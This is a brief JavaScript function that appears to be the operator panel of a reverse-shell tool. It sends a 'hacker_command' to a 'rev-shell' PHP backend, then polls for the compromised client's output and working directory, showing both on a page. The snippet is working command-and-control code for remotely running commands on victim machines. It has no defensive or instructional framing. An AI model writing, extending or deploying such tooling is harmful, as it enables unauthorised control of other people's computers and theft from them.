function request(hacker_command){
    var number = 0
    $.post("rev-shell/send_command_to_client.php",{"command":hacker_command},function(data){
        var timer = setInterval(function() {
            $.get("rev-shell/check_to_recv_data.php", function(data) {
                if (data != "") {
                    obj = JSON.parse(data)
                    $("#result").text(obj.output)
                    $("#path").text(obj.getcwd)
                    clearInterval(timer)
                
                }
            })
            
        
            number += 1
            if (number === 15) {
            clearInterval(timer)
            } //check timer
            
            
        }, 5000)
    })
}


